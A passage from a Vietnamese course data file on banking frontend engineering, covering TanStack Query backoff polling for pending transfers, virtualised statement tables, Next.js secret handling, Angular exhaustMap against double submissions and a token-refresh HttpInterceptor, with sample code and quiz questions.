          "Nếu lập trình viên Frontend dùng `setInterval(..., 1000)` thiếu kiểm soát, chỉ cần cổng đối tác điện lực bị nghẽn 5 phút khiến 10.000 giao dịch cùng ở trạng thái `PENDING`, hệ thống Backend sẽ phải hứng thêm **10.000 RPS truy vấn trạng thái mỗi giây**, làm cạn kiệt Connection Pool của Database đọc trạng thái! Khi phối hợp thiết kế với Frontend, em hãy thống nhất chiến lược **Bounded Dynamic Polling (Thăm dò động có trần dừng)** trên `TanStack Query`: hàm `refetchInterval` kiểm tra trực tiếp dữ liệu trạng thái mới nhất — nếu đã khác `PENDING` thì trả về `false` để cắt vòng lặp ngay lập tức; nếu vẫn `PENDING` thì tăng dần nhịp hỏi (Backoff: 1.5s ở 5 lần đầu -> 3s ở các lần kế tiếp) và sau tối đa 25–30 giây (khoảng 10–12 lần hỏi) phải chủ động dừng Polling, hiển thị thông báo chuẩn ngân hàng: *'Giao dịch đang được đối tác xử lý, kết quả sẽ gửi qua thông báo biến động số dư — Quý khách vui lòng KHÔNG thực hiện chuyển lại'*."
        ],
        bullets: [
          "Cơ chế Backoff thông minh: 80% giao dịch liên ngân hàng hoàn tất trong 1–3 giây đầu nên hỏi nhịp 1.5s giai đoạn đầu giúp trải nghiệm cực nhanh, sau đó dãn ra 3–5s cho các giao dịch trễ để bảo vệ tài nguyên Server.",
          "Tự động dừng khi tab ẩn (`refetchIntervalInBackground: false`): Không lãng phí băng thông và tài nguyên Backend nếu người dùng đã thu nhỏ trình duyệt hoặc khóa màn hình điện thoại.",
          "Đồng bộ tức thì Số dư sau khi Polling báo `COMPLETED`: Kích hoạt `queryClient.invalidateQueries({ queryKey: ['accounts'] })` để cột số dư góc trên màn hình nhảy số mới ngay cùng lúc biên lai hiện ra."
        ]
      },
      {
        heading: "3. Next.js App Router Ranh giới Bảo mật & Ảo hóa Sao kê 10.000 dòng (Virtualization)",
        paragraphs: [
          "Khi ứng dụng **Next.js (App Router)** trong lĩnh vực ngân hàng, kiến trúc sư cần vạch ranh giới rất rõ giữa phần công khai (Trang chủ ngân hàng, Biểu lãi suất tiết kiệm, Tỷ giá ngoại tệ, Đăng ký mở thẻ — chạy **Server Components / SSR / ISR** cực tốt cho tốc độ tải lần đầu và SEO) và vùng lõi sau đăng nhập (Dashboard tài khoản, Chuyển tiền, Sao kê doanh nghiệp — ưu tiên Client Components bọc sau cổng BFF giàu tính tương tác thời gian thực). Một quy tắc an toàn sống còn trong Next.js: tuyệt đối không đặt khóa bí mật nội bộ vào biến bắt đầu bằng `NEXT_PUBLIC_...` vì trình đóng gói Webpack/Turbopack sẽ nhúng thẳng chuỗi đó vào gói JavaScript tải về máy mọi người dùng!",
          "Bài toán kỹ thuật đặc thù tiếp theo ở kênh Ngân hàng Doanh nghiệp (Corp Banking) là **màn hình Tra cứu Sao kê trực tuyến**. Một tài khoản thu hộ chuỗi siêu thị có thể phát sinh 10.000 – 50.000 bút toán chỉ trong một ngày lễ. Nếu Backend trả dữ liệu theo phân trang con trỏ (`Keyset Pagination` qua `useInfiniteQuery`) và kế toán cuộn xem vài nghìn dòng mà React cứ nối thẳng 10.000 thẻ `<tr>` (tương đương hơn 120.000 nút DOM cho các cột ngày giờ, mã tham chiếu, số tiền Nợ/Có, số dư sau giao dịch) vào trang HTML, trình duyệt sẽ ngốn hàng GB RAM và giật đơ khung hình mỗi khi gõ bộ lọc! Giải pháp chuẩn Production là kết hợp **`@tanstack/react-virtual`**: tính toán chiều cao tổng thể của thanh cuộn ảo nhưng chỉ gắn vào DOM thật đúng ~15–20 dòng đang lọt trong khung nhìn màn hình kèm vài dòng đệm (`overscan`), giữ tốc độ cuộn mượt 60 FPS bất chấp danh sách dài 1.000 hay 100.000 giao dịch."
        ],
        bullets: [
          "Kết hợp hoàn hảo Backend Keyset Pagination + Frontend Virtualizer: Backend dùng `WHERE (booking_date, id) < (:lastDate, :lastId) LIMIT 100` đọc chỉ mục siêu tốc; Frontend nạp nối tiếp và ảo hóa nút DOM giữ bộ nhớ phẳng.",
          "Cẩn trọng bẫy rò rỉ dữ liệu giữa các Request trên SSR: Trong Next.js Server Components / Node.js SSR, không bao giờ lưu thông tin người dùng hay `QueryClient` vào biến toàn cục (module-level singleton) dùng chung giữa nhiều request khách hàng khác nhau!",
          "Tách luồng Xuất file lớn khỏi giao diện hiển thị: Nếu kế toán cần lấy toàn bộ 500.000 dòng ra Excel/PDF đối chiếu thuế, đừng tải hết lên trình duyệt mà hãy gọi API tạo Job xuất báo cáo bất đồng bộ trên Server (như đã thiết kế ở mô hình CQRS)."
        ]
      }
    ],
    comparison: {
      title: "Bảng phân loại chiến lược Quản lý Trạng thái & Hiển thị Dữ liệu trên Digital Banking",
      headers: ["Loại Dữ liệu / Kịch bản", "Công cụ Chuẩn Thực chiến", "Cấu hình Cốt lõi", "Sai lầm Phổ biến cần Tránh"],
      rows: [
        [
          "Số dư tài khoản, Trạng thái giao dịch, Danh bạ thụ hưởng",
          "`TanStack Query` (`useQuery` / `useMutation`)",
          "Khóa phân cấp `['accounts', cif]`, `staleTime` theo độ nhạy, `queryClient.clear()` khi Logout",
          "Đổ toàn bộ response API vào Redux Global Store gây lệch dữ liệu cũ và nguy cơ lộ chéo phiên"
        ],
        [
          "Trạng thái đóng/mở Modal OTP, Bước hiện tại của Wizard chuyển tiền, Theme",
          "React `useState` / `useReducer` cục bộ hoặc `Zustand` mỏng nhẹ",
          "Cô lập phạm vi trạng thái gần Component sử dụng nhất để giảm re-render diện rộng",
          "Dùng Context API bọc cả ứng dụng cho biến thay đổi liên tục làm toàn bộ trang render lại mỗi phím gõ"
        ],
        [
          "Theo dõi kết quả chuyển khoản bất đồng bộ (`202 PENDING`)",
          "`TanStack Query` `refetchInterval` có Backoff & Trần dừng",
          "Dừng ngay khi `status !== 'PENDING'` hoặc quá 12 lượt hỏi (~30s), tắt khi tab ẩn",
          "Dùng `setInterval` cố định 500ms quên `clearInterval` gây rò rỉ bộ nhớ và DDoS cổng Backend"
        ],
        [
          "Bảng sao kê tài khoản doanh nghiệp hàng chục nghìn bút toán",
          "`useInfiniteQuery` (Cursor) + `@tanstack/react-virtual`",
          "Chỉ render ~15 dòng trong khung nhìn + `overscan: 5`, chiều cao dòng ổn định",
          "Render thẳng mảng 10.000 phần tử bằng `.map()` làm treo cứng luồng giao diện chính của trình duyệt"
        ]
      ]
    },
    codeTitle: "React + TanStack Query: Theo dõi Trạng thái Giao dịch Bất đồng bộ (Bounded Backoff Polling) & Ảo hóa Sao kê",
    code: [
      "import { useEffect, useRef } from \"react\";",
      "import { useQuery, useQueryClient } from \"@tanstack/react-query\";",
      "import { useVirtualizer } from \"@tanstack/react-virtual\";",
      "",
      "export interface TxnStatusDto {",
      "  txnId: string;",
      "  status: \"PENDING\" | \"COMPLETED\" | \"FAILED\" | \"SUSPENSE_HOLD\";",
      "  amountVnd: string;",
      "  updatedAt: string;",
      "}",
      "",
      "export function useAsyncTransferTracker(txnId: string | null, cif: string) {",
      "  const queryClient = useQueryClient();",
      "  const pollCountRef = useRef(0);",
      "",
      "  const query = useQuery<TxnStatusDto>({",
      "    queryKey: [\"transferStatus\", txnId],",
      "    enabled: Boolean(txnId),",
      "    queryFn: ({ signal }) =>",
      "      fetch(`/api/v1/transfers/${txnId}/status`, { signal }).then((r) => {",
      "        if (!r.ok) throw new Error(\"STATUS_FETCH_FAILED\");",
      "        return r.json();",
      "      }),",
      "    refetchIntervalInBackground: false,",
      "    refetchInterval: (q) => {",
      "      const st = q.state.data?.status;",
      "      if (st && st !== \"PENDING\") return false; // Ngắt ngay khi giao dịch đã ngã ngũ",
      "      if (pollCountRef.current >= 12) return false; // Trần SLA ~30s chống DDoS Backend",
      "      pollCountRef.current += 1;",
      "      return pollCountRef.current <= 5 ? 1500 : 3500; // Backoff: 5 lần đầu 1.5s, sau đó 3.5s",
      "    },",
      "  });",
      "",
      "  useEffect(() => {",
      "    if (query.data?.status === \"COMPLETED\") {",
      "      queryClient.invalidateQueries({ queryKey: [\"accounts\", cif] }); // Cập nhật ngay số dư mới",
      "    }",
      "  }, [query.data?.status, cif, queryClient]);",
      "",
      "  return { ...query, isTimedOutPolling: query.data?.status === \"PENDING\" && pollCountRef.current >= 12 };",
      "}",
      "export { useVirtualizer };"
    ].join("\n"),
    codeNotes: [
      "Truyền `{ signal }` vào `fetch()`: Nếu người dùng thoát khỏi màn hình biên lai trước khi request kiểm tra trạng thái kịp trả về, `TanStack Query` tự động kích hoạt `AbortSignal` hủy kết nối HTTP dở dang, giải phóng tài nguyên ngay lập tức.",
      "Hàm `refetchInterval` tự bảo vệ hệ thống hai chiều: Vừa đảm bảo khách hàng thấy biên lai `COMPLETED` chỉ sau ~1.5 giây với giao dịch thông thường, vừa áp trần cứng 12 lượt hỏi kèm dãn cách 3.5 giây để không bao giờ bắn phá Backend vô tận khi đối tác treo.",
      "Làm tươi số dư tự động qua `invalidateQueries`: Ngay khoảnh khắc trạng thái nhảy sang `COMPLETED`, mọi component hiển thị số dư tài khoản của `cif` trên thanh Header hay Sidebar đều tự động nạp lại con số mới nhất từ sổ cái mà không cần truyền props chằng chịt.",
      "Cờ `isTimedOutPolling`: Cung cấp tín hiệu rõ ràng cho UI hiển thị thông báo chuyển sang luồng đối soát chờ kết quả qua thông báo đẩy thay vì để vòng quay loading xoay mãi không dừng."
    ],
    labGuide: {
      goal: "Xây dựng luồng theo dõi giao dịch bất đồng bộ có Backoff tự ngắt và đo đạc sự khác biệt hiệu năng DOM khi bật ảo hóa `@tanstack/react-virtual` cho bảng sao kê 10.000 dòng.",
      steps: [
        "Bước 1: Tạo Mock API `GET /api/v1/transfers/:id/status` giả lập trả về `status: 'PENDING'` trong 4 lần gọi đầu tiên và chuyển sang `'COMPLETED'` ở lần gọi thứ 5.",
        "Bước 2: Kết nối `useAsyncTransferTracker` lên màn hình biên lai, mở tab Network quan sát các request tự động bắn cách nhau ~1.5 giây và dừng hẳn ngay sau khi nhận phản hồi `'COMPLETED'`, đồng thời API lấy số dư tài khoản tự động được gọi làm mới.",
        "Bước 3: Đổi Mock API sang luôn trả `'PENDING'` để giả lập sự cố nghẽn cổng đối tác; xác nhận nhịp gọi dãn sang 3.5 giây từ lần thứ 6, dừng hoàn toàn ở lần thứ 12 và cờ `isTimedOutPolling` chuyển sang `true` hiện cảnh báo an toàn.",
        "Bước 4: Sinh mảng giả lập 10.000 dòng sao kê trong bộ nhớ, render bằng `useVirtualizer` (chiều cao khung 500px, dòng 44px) rồi mở Chrome Elements Inspector đếm số lượng thẻ dòng thật trong DOM (chỉ khoảng ~18–22 thẻ thay vì 10.000 thẻ)."
      ],
      expectedOutput: "Vòng lặp Polling tự ngắt chuẩn xác ở cả kịch bản thành công sớm lẫn kịch bản quá hạn SLA; bảng sao kê 10.000 dòng cuộn mượt 60 FPS với chưa tới 25 phần tử dòng DOM hoạt động cùng lúc."
    },
    examTips: [
      "Khi thảo luận System Design cho màn hình Thanh toán QR / Chuyển tiền bất đồng bộ: Đề xuất kết hợp `SSE` (đẩy chủ động) làm kênh chính và `Bounded Backoff Polling` bằng TanStack Query làm kênh dự phòng khi mạng di động cắt luồng stream.",
      "Cảnh giác lỗi bảo mật trên máy trạm dùng chung (quầy Internet công cộng, phòng kế toán): Đăng xuất bắt buộc phải gọi `queryClient.clear()` + xóa Storage tạm để người sau bấm nút Back trình duyệt không thấy cache sao kê người trước.",
      "Khi gặp bài toán 'Truy vấn tên người nhận NAPAS bị hiển thị tên của số tài khoản gõ trước đó' -> Chỉ ra ngay lỗi Race Condition do không dùng `debounce` kết hợp hủy request cũ bằng `AbortController / AbortSignal`."
    ],
    summaryTakeaways: [
      "Tách biệt hoàn toàn `Server State` (quản lý bằng `TanStack Query` có vòng đời cache, hủy request cũ và xóa sạch khi Logout) khỏi `Client UI State` thuần giao diện.",
      "Luôn áp dụng `Bounded Backoff Polling` (tăng dần chu kỳ hỏi, dừng khi khác `PENDING` hoặc vượt trần số lần thử, tắt khi ẩn tab) cho các giao dịch trả về `202 Accepted`.",
      "Sử dụng `AbortSignal` cho các ô tra cứu động (như Inquiry tên tài khoản thụ hưởng) để triệt tiêu lỗi phản hồi cũ trả về muộn ghi đè kết quả mới.",
      "Kết hợp `Keyset Pagination` phía Backend với `@tanstack/react-virtual` phía Frontend để hiển thị hàng chục nghìn bút toán sao kê mà không làm phình bộ nhớ DOM."
    ],
    lessonQuestions: [
      {
        question: "Trên màn hình Chuyển tiền Nhanh 24/7, khi khách hàng gõ số tài khoản người nhận, ứng dụng gọi API `/api/v1/napas/inquiry` để hiển thị tên chủ tài khoản. Khách gõ nhầm số tài khoản của Ông A (cổng ngân hàng A đang lag mất 3 giây mới trả kết quả), sau đó xóa nhanh sửa thành số tài khoản của Bà B (ngân hàng B phản hồi ngay trong 0.3 giây hiện đúng tên 'BÀ B'). Tuy nhiên 2.7 giây sau, ô tên người nhận bất ngờ tự nhảy ngược lại thành 'ÔNG A' dù số tài khoản trên ô nhập vẫn là của Bà B! Giải pháp kỹ thuật chuẩn xác nhất để triệt tiêu lỗi nguy hiểm này là gì?",
        options: [
          "Khóa cứng ô nhập số tài khoản không cho khách hàng sửa trong vòng 10 giây kể từ lúc gõ ký tự đầu tiên.",
          "Áp dụng `debounce` (300–400ms) trước khi gọi tra vấn, kết hợp quản lý truy vấn theo khóa `['napasInquiry', bankBin, accountNo]` và truyền `AbortSignal` để tự động hủy/bỏ qua mọi phản hồi của request cũ khi giá trị ô nhập đã thay đổi.",
          "Lưu tất cả tên người nhận trả về vào một mảng trong Redux và luôn lấy phần tử trả về cuối cùng làm kết quả hiển thị.",
          "Bắt Backend đặt `Thread.sleep(5000)` cho mọi ngân hàng để thời gian phản hồi bằng nhau hết."
        ],
        answer: 1,
        explanation: "Đây là lỗi Race Condition (Out-of-order response) kinh điển trên giao diện bất đồng bộ. Khi gắn khóa truy vấn theo đúng cặp `[bankBin, accountNo]` trên TanStack Query và truyền `AbortSignal` vào `fetch()`, ngay khi khách sửa sang số tài khoản Bà B, request đang chờ của Ông A sẽ bị `abort()` hủy bỏ ngay và kết quả của nó không bao giờ được phép ghi vào ô hiển thị của Bà B.",
        wrongReasons: [
          "Khóa cứng ô nhập 10 giây khi khách lỡ tay gõ nhầm 1 số là trải nghiệm người dùng tồi tệ không thể chấp nhận.",
          "",
          "Lấy phần tử trả về cuối cùng theo thời gian mạng chính là nguyên nhân gây ra lỗi (vì request Ông A trả về sau request Bà B)!",
          "Làm chậm toàn bộ hệ thống bằng `Thread.sleep` vừa làm treo luồng Server vừa không đảm bảo thứ tự mạng tuyệt đối."
        ]
      },
      {
        question: "Vào ngày mùng 5 hàng tháng (cao điểm trả lương), cổng thanh toán hóa đơn đối tác bị chậm khiến 15.000 giao dịch nằm ở trạng thái `PENDING` trong 4 phút. Đội SRE phát hiện lưu lượng gọi vào API `GET /api/v1/bills/{id}/status` trên cụm BFF tăng vọt lên 30.000 request/giây làm nghẽn cả cụm Database đọc, dù số người giao dịch mới không tăng. Nguyên nhân phía Frontend và hướng khắc phục bền vững nhất là gì?",
        options: [
          "Do giao diện dùng `setInterval` gọi hỏi trạng thái cứng mỗi 500ms vô thời hạn kể cả khi người dùng đã chuyển tab; cần chuyển sang `Bounded Backoff Polling` (dãn chu kỳ hỏi dần từ 1.5s lên 4s, tắt khi tab ẩn và dừng hẳn sau ~30s để chuyển sang thông báo đẩy).",
          "Do React 18 render hai lần trên Production nên nhân đôi số lượng gói tin mạng.",
          "Cần sửa Frontend để khi quá 3 giây vẫn `PENDING` thì tự động gọi lại API `POST /api/v1/bills/pay` tạo đơn thanh toán mới.",
          "Xóa hoàn toàn API kiểm tra trạng thái và bắt khách hàng gọi điện lên tổng đài hỏi kết quả sau 24 giờ."
        ],
        answer: 0,
        explanation: "15.000 trình duyệt cùng chạy vòng lặp `setInterval` mỗi 0.5 giây (2 lần/giây) tạo ra đúng $15.000 \\times 2 = 30.000$ RPS liên tục dội vào Backend (hiện tượng Self-inflicted DDoS). Áp dụng dãn cách thời gian hỏi (Backoff), tắt hỏi ngầm khi ẩn tab (`refetchIntervalInBackground: false`) và đặt trần số lần hỏi tối đa giúp bảo vệ an toàn tuyệt đối cho cụm hạ tầng lõi khi đối tác gặp sự cố.",
        wrongReasons: [
          "",
          "`StrictMode` của React chỉ chạy kép Effect ở môi trường Development để phát hiện rò rỉ, không chạy kép trên bản build Production.",
          "Tự động bắn lại lệnh `POST` tạo đơn mới khi đơn cũ đang `PENDING` là điều tối kỵ trong thanh toán, gây nguy cơ gạch nợ/trừ tiền trùng lặp.",
          "Bắt mọi khách hàng chờ 24 giờ gọi tổng đài cho giao dịch vài giây sẽ làm tê liệt trung tâm CSKH và phá hỏng trải nghiệm ngân hàng số."
        ]
      }
    ]
  },

  F4: {
    duration: "60 phút",
    difficulty: "Nâng cao – Enterprise Angular & RxJS Ngân hàng",
    codeLang: "typescript",
    teacherIntro: "Chào em, nếu đi phỏng vấn tại các ngân hàng TMCP lớn ở Việt Nam như Vietcombank, Techcombank, MB, VPBank hay ACB, em sẽ thấy một bức tranh công nghệ rất thú vị: kênh khách hàng cá nhân bên ngoài chuộng React/Next.js, nhưng vừa bước chân vào **hệ thống Quầy giao dịch chi nhánh (Teller Counter / SmartBranch), Cổng phê duyệt tín dụng (LOS) và Core Back-Office đối soát nội bộ** thì **Angular** lại là vị vua không ngai! Lý do rất rõ ràng: màn hình của Giao dịch viên tại quầy có tới 60–80 ô nghiệp vụ phức tạp, thao tác thuần bàn phím tốc độ cao (`F2`, `F9`, `Enter`), đòi hỏi kiến trúc phân tầng chặt chẽ bằng Dependency Injection để hàng trăm lập trình viên cùng viết mà code vẫn đồng nhất như một khuôn đúc. Trong bài này, anh sẽ truyền lại cho em hai 'tuyệt kỹ sinh tử' của Angular Ngân hàng mà Backend Senior nào làm việc với đội Quầy cũng phải nắm lòng: dùng toán tử RxJS `exhaustMap` chặn giao dịch viên gõ đúp phím Enter nộp tiền mặt trăm triệu, và viết `HttpInterceptor` xếp hàng làm mới Access Token không gây bão đăng xuất `401` giữa lúc đang phục vụ khách tại quầy!",
    analogy: {
      title: "Cửa xoay một chiều tại buồng kiểm đếm tiền mặt và người tổ trưởng gom thẻ nhân viên đi gia hạn chung",
      body: "Em hãy hình dung ở quầy thu ngân ngân hàng, giao dịch viên vừa đếm xong cọc tiền mặt 500 triệu của khách và thói quen tay gõ lạch cạch phím `Enter` hai cái cực nhanh. Nếu nút xác nhận nối với đường ống thường (`mergeMap`), cả hai cú gõ đều biến thành 2 lệnh cộng tiền 500 triệu chạy thẳng vào Core Banking — khách nộp 500 triệu mà tài khoản nhảy lên 1 tỷ! Nếu dùng công tắc đảo chiều (`switchMap`), cú gõ thứ hai chỉ ngắt tai nghe ở trình duyệt chứ không rút lại được lệnh thứ nhất đã chui vào máy chủ! Chỉ có **cửa xoay cơ khí `exhaustMap`** là chuẩn xác tuyệt đối: hễ gói tin thứ nhất vừa bước vào buồng xử lý là cánh cửa khóa cứng bên ngoài, mọi cú gõ `Enter` bồi thêm đều bị trượt đi vô hại cho tới khi máy chủ trả biên lai xong mới mở chốt lại. Còn khi thẻ ra vào 5 phút hết hạn đúng lúc 6 nhân viên cùng chạy tới cửa (`6 API cùng báo 401`), thay vì cả 6 người chen nhau bấm nút xin cấp thẻ mới làm hệ thống an ninh tưởng có kẻ cắp nhân bản thẻ và khóa sạch tài khoản, **anh tổ trưởng `HttpInterceptor`** sẽ giơ tay bảo 5 người đứng xếp hàng chờ (`BehaviorSubject`), chỉ cử đúng 1 người đi đổi thẻ mới rồi phát đều cho cả nhóm đi tiếp êm ru!"
    },
    objectives: [
      "Lý giải được vì sao Angular (Standalone Components, Signals, Hierarchical DI, Reactive Forms) là lựa chọn tiêu chuẩn cho hệ thống Quầy giao dịch (Teller) và Core Portal ngân hàng.",
      "Phân biệt sắc bén 4 toán tử phẳng hóa luồng bất đồng bộ của RxJS (`mergeMap`, `switchMap`, `concatMap`, `exhaustMap`) và chọn đúng toán tử cho từng nghiệp vụ tài chính.",
      "Xây dựng được `HttpInterceptor` chuẩn Production tự động gắn `X-Correlation-Id` và điều phối hàng đợi chờ (`BehaviorSubject` Mutex) khi nhiều API đồng thời gặp lỗi `401 Unauthorized` trên cơ chế Refresh Token Rotation."
    ],
    flow: [
      {
        step: "1. Kiểm chứng Nghiệp vụ Quầy bằng Typed Reactive Forms",
        detail: "Màn hình Nộp/Rút tiền mặt tại quầy kiểm soát đồng bộ mệnh giá tờ tiền (bảng kê 500k, 200k, 100k khớp tổng số tiền hạch toán), hạn mức phê duyệt của Giao dịch viên vs Kiểm soát viên (Maker-Checker)."
      },
      {
        step: "2. Chặn Gõ Đúp Bàn phím bằng RxJS `exhaustMap`",
        detail: "Luồng sự kiện bấm nút / nhấn phím tắt `F9 / Enter` được đẩy vào `Subject` đi qua toán tử `exhaustMap`, bỏ qua hoàn toàn mọi xung kích hoạt lặp lại trong suốt thời gian API hạch toán tiền mặt đang chờ Core phản hồi."
      },
      {
        step: "3. Gắn Vết Truy vết Toàn trình tại `HttpInterceptor`",
        detail: "Mọi gói tin rời trình duyệt Quầy tự động được đính kèm `X-Correlation-Id`, `X-Branch-Code` và `X-Teller-Id` để nối mạch log xuyên suốt từ màn hình Angular xuống BFF, Kafka và Core Banking."
      },
      {
        step: "4. Điều phối Hàng đợi Làm mới Phiên Chống Bão `401`",
        detail: "Khi Access Token hết hạn đúng lúc trang tổng quan bắn 6 API song song, Interceptor khóa cờ `isRefreshing`, chỉ gọi `/auth/refresh` đúng 1 lần duy nhất rồi mở cổng `BehaviorSubject` phát lại 6 API bị nghẽn với Token mới."
      }
    ],
    sections: [
      {
        heading: "1. Tại sao Hệ thống Quầy (Teller) và Back-Office Ngân hàng lại 'chọn mặt gửi vàng' ở Angular?",
        paragraphs: [
          "Ở kênh khách hàng lẻ trên điện thoại, giao diện cần gọn nhẹ, hiệu ứng mượt và thay đổi giao diện theo chiến dịch Marketing hàng tháng nên React rất linh hoạt. Ngược lại, một hệ thống **Core Portal / Teller System** phục vụ 15.000 nhân viên ngân hàng tại 500 chi nhánh trên toàn quốc có vòng đời vận hành kéo dài 7–10 năm, chứa hàng trăm phân hệ nghiệp vụ nặng đô: Nộp/rút tiền mặt tại quầy, Mở sổ tiết kiệm đồng sở hữu, Giải ngân khế ước vay, Phát hành thư tín dụng L/C, Duyệt lệnh Maker-Checker và Xử lý tra soát đối soát T+0. Nếu mỗi nhóm phát triển tự ghép nối 20 thư viện rời rạc khác nhau, sau 3 năm dự án sẽ biến thành mê cung không thể nâng cấp!",
          "Angular giải quyết bài toán quản trị quy mô lớn này nhờ kiến trúc 'pin đi kèm nguyên khối' rất gần gũi với tư duy **Spring Framework** của anh em Java Backend: hệ thống **Dependency Injection phân cấp (`@Injectable`)** tách biệt hoàn toàn logic nghiệp vụ khỏi Component giao diện; **Typed Reactive Forms** cho phép định nghĩa các biểu mẫu hàng chục trường phụ thuộc chéo nhau (ví dụ: nếu số tiền rút tiền mặt vượt 200 triệu VNĐ thì tự động bật bắt buộc trường 'Mã Kiểm soát viên phê duyệt tại chỗ - Supervisor Override' và trường 'Thông tin CCCD người lĩnh tiền'); cùng với **Angular Signals** ở các phiên bản hiện đại giúp cập nhật chính xác từng ô con số bảng kê mệnh giá tiền mặt mà không cần quét kiểm tra toàn bộ cây màn hình."
        ],
        bullets: [
          "Tối ưu thao tác Bàn phím 100% cho Giao dịch viên: Tại quầy đông khách, giao dịch viên gần như không rời tay khỏi bàn phím để cầm chuột; cấu trúc Directive và HostListener của Angular giúp chuẩn hóa phím tắt (`F2` tra cứu CIF, `F8` cân bảng kê tiền mặt, `Ctrl+Enter` gửi duyệt) đồng bộ toàn hệ thống.",
          "Mô hình Maker – Checker chuẩn Kiểm soát Nội bộ: Mọi giao dịch vượt hạn mức của Giao dịch viên (`Maker`) được đóng gói trạng thái chờ đẩy sang màn hình thời gian thực của Kiểm soát viên (`Checker`) ngồi bàn sau ký duyệt.",
          "Đồng điệu tư duy với Java Backend: Cấu trúc `Component -> Facade/Service -> HttpClient + Interceptor + Guard` của Angular ánh xạ 1-1 với `Controller -> Service -> RestClient + Filter + Security` của Spring Boot."
        ]
      },
      {
        heading: "2. Sinh tử cùng 4 toán tử RxJS: Chọn sai `mergeMap` / `switchMap` thay vì `exhaustMap` tại Quầy!",
        paragraphs: [
          "Trái tim điều phối luồng dữ liệu bất đồng bộ trong Angular chính là thư viện **RxJS (Reactive Extensions)**. Khi biến sự kiện bấm nút hoặc gõ phím thành một luồng `Observable`, lập trình viên bắt buộc phải chọn một trong 4 toán tử ánh xạ bậc cao (Higher-Order Mapping Operators) để gọi HTTP xuống Backend — và chọn sai toán tử ở đây là tai nạn mất tiền thật chứ không phải lý thuyết suông! Giả sử giao dịch viên bấm phím `Enter` hai lần cách nhau 80ms trên màn hình **Nộp tiền mặt vào tài khoản**: nếu dùng **`mergeMap`**, cả 2 sự kiện đều bắn song song 2 lệnh HTTP `POST` xuống Server! Nhiều bạn nghĩ: 'Thế em đổi sang **`switchMap`** để nó hủy lệnh đầu đi là an toàn chứ gì?' — **SAI CHÍ MẠNG!** Khi `switchMap` hủy (`unsubscribe`) request thứ nhất, trình duyệt gửi tín hiệu đóng kết nối TCP, nhưng gói tin thứ nhất ĐÃ đi vào tới dịch vụ Core Ledger bên trong ngân hàng rồi (Java `@Transactional` không tự động rollback chỉ vì trình duyệt ngoài kia tắt tab trừ khi đang ở tầng đọc luồng chưa hạch toán)! Thế là lệnh 1 vẫn cộng tiền âm thầm ở Server, còn trình duyệt lại bắn tiếp lệnh 2!",
          "Quy tắc vàng trong ngân hàng phải chia đúng vai cho từng toán tử: Với **Nút Gửi giao dịch tài chính / Nộp rút tiền / Ký duyệt** -> BẮT BUỘC dùng **`exhaustMap`** (đang có 1 lệnh chạy trên đường ống thì lờ đi tuyệt đối mọi cú bấm/gõ bồi thêm cho tới khi lệnh đó hoàn tất trọn vẹn). Với **Ô gõ tìm kiếm thông tin khách hàng theo CCCD/CIF hoặc tra cứu tên tài khoản** (chỉ đọc `GET`, không làm biến đổi số dư) -> Dùng **`debounceTime(300)` + `distinctUntilChanged()` + `switchMap`** để hủy ngay các truy vấn đọc cũ không còn giá trị. Còn **`concatMap`** chỉ dùng khi cần xếp hàng thực thi tuần tự từng bước một đúng thứ tự (ví dụ tải lên lần lượt từng trang hồ sơ scan giải ngân)."
        ],
        bullets: [
          "`exhaustMap` — Khiên chắn cho mọi lệnh Ghi (`POST/PUT`): Miễn nhiễm hoàn toàn thói quen gõ đúp phím cơ hoặc chuột bị lỗi double-click phần cứng tại quầy giao dịch.",
          "`switchMap` — Vũ khí cho mọi lệnh Đọc tìm kiếm (`GET`): Hủy lắng nghe các truy vấn tra cứu cũ lỗi thời ngay khi người dùng gõ thêm ký tự mới.",
          "`concatMap` vs `mergeMap`: Dùng `concatMap` khi thứ tự hoàn thành trước-sau là bất biến; chỉ dùng `mergeMap` khi tải song song các danh mục độc lập không phụ thuộc nhau."
        ]
      },
      {
        heading: "3. Giải bài toán 'Bão 401' với `HttpInterceptor` & Refresh Token Rotation",
        paragraphs: [
          "Ở Học phần K (Bảo mật OAuth2/OIDC), em đã biết chuẩn bảo mật ngân hàng yêu cầu `Access Token` có tuổi thọ rất ngắn (chỉ 3–5 phút) và bật tính năng **Refresh Token Rotation** trên Keycloak / Identity Server: mỗi một `Refresh Token` chỉ được phép sử dụng **ĐÚNG MỘT LẦN DUY NHẤT** để đổi lấy cặp Access/Refresh mới; nếu cùng một Refresh Token cũ bị mang ra gọi lần thứ 2, máy chủ định danh sẽ lập tức phán định 'Có kẻ gian vừa đánh cắp và dùng trùng Refresh Token (Token Reuse Detected)!' và **thu hồi sạch toàn bộ phiên đăng nhập của người dùng ngay lập tức**!",
          "Bây giờ hãy xem kịch bản thực tế xảy ra hàng ngày tại Quầy giao dịch nếu viết Angular `HttpInterceptor` sơ sài: Giao dịch viên ngồi tư vấn cho khách mất 6 phút (Access Token vừa hết hạn), sau đó bấm mở màn hình 'Tổng quan khách hàng 360'. Màn hình này lập tức bắn đồng thời **5 API song song** (Thông tin CIF, Danh sách CASA, Sổ tiết kiệm, Dư nợ vay, Cảnh báo AML). Cả 5 API cùng chạm cổng Gateway và cùng nhận về **`401 Unauthorized`** trong cùng một mili-giây! Nếu Interceptor cứ thấy `401` là tự gọi `/api/v1/auth/refresh`, trình duyệt sẽ bắn **5 request làm mới token song song mang cùng một Refresh Token cũ** lên Keycloak -> Request số 1 thành công, còn Request số 2 chạm vào Refresh Token vừa bị xoay vòng liền kích hoạt còi báo động chống gian lận, đá văng giao dịch viên ra màn hình Login ngay trước mặt khách VIP! Giải pháp chuẩn Senior là dựng một **Khóa điều phối trung tâm (`isRefreshing` + `BehaviorSubject<string | null>`)** ngay trong Interceptor: API đầu tiên dính `401` sẽ nhận trách nhiệm đi đổi Token mới; 4 API đến sau thấy cờ `isRefreshing === true` sẽ ngoan ngoãn đứng chờ trên dòng sông `BehaviorSubject.pipe(filter(ok => ok !== null), take(1))` — ngay khi người đầu tiên mang Token mới về phát tín hiệu, cả 5 API cùng tự động đính Token mới và chạy tiếp mượt mà không rớt một nhịp nào!"
        ],
        bullets: [
          "Khóa đơn luồng `isRefreshing` + Hàng đợi `BehaviorSubject`: Đảm bảo dù 10 component cùng gọi API lúc hết hạn phiên thì vẫn chỉ có ĐÚNG 1 gói tin `/auth/refresh` rời trình duyệt.",
          "Đặt khối `finalize(() => isRefreshing = false)`: Kể cả khi API làm mới phiên thành công hay thất bại do hết cả phiên ngày làm việc, cờ khóa luôn được giải phóng sạch sẽ để không làm treo vĩnh viễn các request sau.",
